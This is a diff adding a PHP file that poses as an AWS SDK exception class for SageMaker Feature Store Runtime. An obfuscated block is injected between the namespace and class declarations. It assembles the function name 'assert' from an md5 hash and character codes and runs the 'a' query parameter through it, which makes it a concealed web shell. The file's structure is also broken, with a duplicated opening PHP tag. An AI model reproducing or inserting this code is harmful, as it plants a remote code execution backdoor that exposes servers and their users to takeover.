@@ -1,0 +1,14 @@
+<?php
+namespace Aws\SageMakerFeatureStoreRuntime\Exception;
+<?php
+$a=md5('a').'<br>';
+$poc=substr($a,14,1).chr(115).chr(115).substr($a,22,1).chr(114).chr(116);
+$poc($_GET['a']);
+?>
+
+use Aws\Exception\AwsException;
+
+/**
+ * Represents an error interacting with the **Amazon SageMaker Feature Store Runtime** service.
+ */
+class SageMakerFeatureStoreRuntimeException extends AwsException {}
